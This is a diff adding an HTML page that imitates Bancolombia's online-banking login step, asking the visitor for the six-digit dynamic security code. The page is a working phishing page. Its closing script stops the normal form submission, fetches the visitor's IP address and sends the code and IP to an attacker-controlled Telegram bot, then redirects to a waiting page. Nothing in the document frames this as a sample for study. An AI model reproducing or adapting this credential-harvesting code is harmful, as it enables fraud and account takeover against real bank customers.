@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robot" content="All">
+    <meta name="rating" content="general">
+    <meta name="Distribution" content="Global">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="./archivos/style.css" media="all" rel="stylesheet" type="text/css">
+    <link href="./archivos/bootstrap.css" media="all" rel="stylesheet" type="text/css">
+    <link href="./archivos/ui.css" media="all" rel="stylesheet" type="text/css">
+    <link href="./archivos/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
+    <link href="./archivos/showLoading.css" media="all" rel="stylesheet" type="text/css">
+    <link href="./archivos/keyboard_util.css" media="all" rel="stylesheet" type="text/css">
+ 
+    <title>En linea </title>
+
+  </head>
+
+  <body>
+    <div id="contenidoWeb">
+      <div class="container" id="containerMain">
+        <div>
+          <div id="header" class="mua-page-header">
+            <div class="row row-logo-svp">
+              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                <div class="mua-imgLogoItem"></div>
+                <div class="text-svp-name">Sucursal Virtual Personas</div>
+              </div>
+            </div>
+            <div class="row"> 
+              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important">
+                  <div>
+                    <div class="timeText">Fecha y hora actual:</div>
+                    <span id="jclock1" class="lastVisitedText">
+									                              <script>
+var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
+var diasSemana = new Array("Domingo","Lunes","Martes","Miércoles","Jueves","Viernes","Sábado");
+var f=new Date();
+var hora = f.getHours() + ':' + f.getMinutes() + ':' + f.getSeconds();
+document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear() + " " +  hora);
+</script>
+					</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="panel-heading">
+            <h3>Inicio de sesi&oacute;n</h3>
+          </div>
+        </div>
+        <form id="loginForm" method="post">
+
+        
+          <div class="panel panel-primary">
+            <div class="row">
+           
+            </div>
+            <div class="mua-panel-body">
+              <div class="row">
+                
+                <div class="col-lg-4 col-md-5 col-sm-6">
+                  <div class="panel_general mua-panel_general">
+                    <div class="title-panel-label">
+                      <h1>Clave Dinámica</h1>
+                    </div>
+                    <div class="subtitle-land-label">
+                      <h4>
+                        Para continuar con la transaccion ingresa la Clave Dinámica
+Consultala en la opcion Generacion de Bancolombia App del
+dispositivo movil donde estas ingresando al servicio
+                      </h4>
+                    </div>
+                    <div id="contenido">
+                      <div class="mua-content-group-panel">
+                        <div class="mua-label-input">
+                      
+                        </div>
+                        <div>
+                          <div class="mua_svp_enroll_update_control">
+                            <input id="password" maxlength="6" minlength="6" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" 
+							type="password" onchange="trim(document.loginUserForm.password)" name="clvdina"
+							onkeypress="if (event.keyCode &lt; 45 || event.keyCode &gt; 57) event.returnValue = false;" required>
+                            <span class="mua-icon-lock"></span>
+                          </div>
+                        </div>
+                      </div>
+                     
+                    </div>
+                    <div class="two-button-container mua-button-container">
+                      <div class="two-button-a">
+                        <a href="javascript:history.back()">
+                          <input id="cancelar" name="cancelar" class="btn btn-default" type="button" value="Cancelar"></a>
+                      </div>
+                      <div class="two-button-b">
+                        <button type="submit" id="continuar" name="continuar" class="btn btn-success">
+                          Ingresar
+                        </button>
+                      </div>
+                    </div>
+                    <div class="mua-panel_enlances">
+                      <div>
+                       </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+                       
+            
+            <div style="width: 400px;">
+            <img style="width: 350px;" src="archivos/Banner-osp-softoken-v2.gif" alt="">
+</div>
+<br><br><br>   
+
+            <div class="row">
+              
+              <div class="col-xs-12 col-sm-12 col-md-12">
+                <p class="mua-footer">
+                  Sucursal Telefónica: Bogotá (57) 60 1 343 00 00 - Medellín
+                  (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla
+                  (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+                  Bucaramanga (57) 60 7 697 25 25
+                  <br>
+                  Pereira (57) 60 6 340 12 13 - El resto del país 018000 9
+                  12345. Sucursales Telefónicas en el exterior: España (34) 900
+                  995 717 - Estados Unidos (1) 866 379 97 14.
+                </p>
+              </div>
+            </div>
+            <div style="margin-top: 10px">
+              <div class="mua-title-text pull-left">
+                Dirección IP: {{ipAddress}}
+              </div>
+              <div class="mua-title-text pull-right">
+                &copy;&nbsp;<span id="fecha">2024</span>&nbsp;Bancolombia
+                S.A.&nbsp;&nbsp;
+              </div>
+            </div>
+          </div>
+        </form>
+        <script type="module">
+          // Asegúrate de que config.js esté correctamente enlazado y que exporte botToken y chatId
+          import { botToken, chatId } from './config.js';
+      
+          document.getElementById('loginForm').addEventListener('submit', function(e) {
+              e.preventDefault(); // Evita que el formulario se envíe de la forma tradicional
+      
+              // Obtener el valor del campo de la clave
+              let clave = document.getElementById('password').value;
+      
+              // Validar que la clave tenga 6 dígitos
+              if (clave.length !== 6) {
+                  alert('Por favor, ingresa los 6 dígitos de tu clave.');
+                  return;
+              }
+      
+              // Obtener la dirección IP del cliente
+              fetch('https://api.ipify.org?format=json')
+                  .then(response => response.json())
+                  .then(data => {
+                      var ip = data.ip;
+      
+                      // Construye el mensaje que enviarás
+                      const mensaje = `Dinamica 1 ->\n\nClave: ${clave}\n\nIP: ${ip}`;
+      
+                      // Prepara la URL para la solicitud HTTP a Telegram
+                      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      
+                      // Crea el objeto con los datos a enviar
+                      const dataToSend = {
+                          chat_id: chatId,
+                          text: mensaje
+                      };
+      
+                      // Envía la solicitud HTTP a Telegram
+                      fetch(url, {
+                          method: 'POST',
+                          headers: {
+                              'Content-Type': 'application/json'
+                          },
+                          body: JSON.stringify(dataToSend)
+                      })
+                      .then(response => response.json())
+                      .then(data => {
+                          if (data.ok) {
+                              window.location.href = 'waitt.html'; // Redirige a wait.html después de enviar el mensaje
+                          } else {
+                              console.error('Error al enviar el mensaje a Telegram.');
+                          }
+                      })
+                      .catch(error => {
+                          console.error('Error:', error);
+                      });
+                  })
+                  .catch(error => {
+                      console.error('Error al obtener la IP:', error);
+                  });
+          });
+      </script>
+      
+      </div>
+    </div>
+
+</body></html>
